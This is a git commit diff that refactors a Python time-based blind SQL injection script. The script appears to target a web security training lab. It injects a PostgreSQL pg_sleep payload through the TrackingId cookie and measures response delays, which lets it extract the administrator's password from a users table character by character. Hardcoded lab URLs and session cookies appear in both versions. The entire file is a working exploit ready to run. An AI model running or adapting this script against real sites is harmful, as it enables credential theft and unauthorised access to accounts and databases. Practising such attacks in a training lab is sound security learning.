381bdf1ee4660cd201841e23e026a26d3830ead4
0x2nac0nda <58049681+abdallaabdalrhman@users.noreply.github.com>
2023-11-25 03:30:48 +0300

    Update time_based_sql_injection.py

--- time_based_sql_injection.py
+++ time_based_sql_injection.py
@@ -1,51 +1,59 @@
 import requests
 import string
+import time
 
-# Author : 0x2nac0nda
+# Author: 0x2nac0nda
 
-# Base character set
-base = string.ascii_lowercase + string.ascii_uppercase + string.digits
+def time_based_sql_injection(url, character_set, session_cookie):
+    """
+    Perform time-based SQL injection to guess a password.
+    
+    :param url: Target URL for the SQL injection.
+    :param character_set: Set of characters to use for guessing.
+    :param session_cookie: Session cookie value for maintaining session.
+    :return: Guessed password.
+    """
+    password = ""
+    session = requests.Session()
 
-# Initialize password
-p = ""
+    headers = {
+        "Cache-Control": "max-age=0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
+        "Upgrade-Insecure-Requests": "1",
+        "Connection": "close",
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3877.0 Safari/537.36",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept-Language": "en-US,en;q=0.9"
+    }
 
-# Create a session
-session = requests.Session()
+    for position in range(1, 21):
+        for character in character_set:
+            cookies = {
+                "TrackingId": f"6hVWELZ0Hxp48ugJ'||(select case when(username='administrator' and substring(password,{position},1)='{character}') then pg_sleep(10) else pg_sleep(0) end from users)||'z",
+                "session": session_cookie
+            }
 
-# Headers for the request
-headers = {
-    "Cache-Control": "max-age=0",
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
-    "Upgrade-Insecure-Requests": "1",
-    "Connection": "close",
-    "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3877.0 Safari/537.36",
-    "Accept-Encoding": "gzip, deflate",
-    "Accept-Language": "en-US,en;q=0.9"
-}
+            try:
+                start_time = time.time()
+                response = session.get(url, headers=headers, cookies=cookies)
+                elapsed_time = time.time() - start_time
 
-# Target URL
-url = "https://0a35001103dd95b5809353b100c00047.web-security-academy.net/"
+                if elapsed_time >= 10:  # Assuming a delay of 10 seconds indicates a match
+                    password += character
+                    print(password)
+                    break
+            except requests.RequestException as e:
+                print(f"An error occurred: {e}")
 
-# Iterate over each position in the password
-for i in range(1, 21):
-    for c in base:
-        # Set cookies for SQL injection
-        cookies = {
-            "TrackingId": f"6hVWELZ0Hxp48ugJ'||(select case when(username='administrator' and substring(password,{i},1)='{c}') then pg_sleep(10) else pg_sleep(0) end from users)||'z",
-            "session": "ADwAGXDatCejU0vjwyAtrmXfFAlZocp3"
-        }
+    return password
 
-        try:
-            # Make the request
-            req = session.get(url, headers=headers, cookies=cookies)
-            t = req.elapsed.total_seconds()
-            if t >= 10:
-                p += c
-                print(p)
-                break
-        except requests.RequestException as e:
-            print(f"An error occurred: {e}")
-            continue
+# Target URL and session cookie
+target_url = "https://0ad30007033cad1182753d7c00b40096.web-security-academy.net/"
+session_cookie_value = "oZ4Su9lPQVSQ9RgPUA1kbraBPJBAhtD4"
 
-# Final password
-print(f'[+] Password: [{p}]')
+# Base character set including lowercase, uppercase letters, and digits
+base_characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
+
+# Perform SQL injection to guess the password
+guessed_password = time_based_sql_injection(target_url, base_characters, session_cookie_value)
+print(f'[+] Found administrator password: [{guessed_password}]')
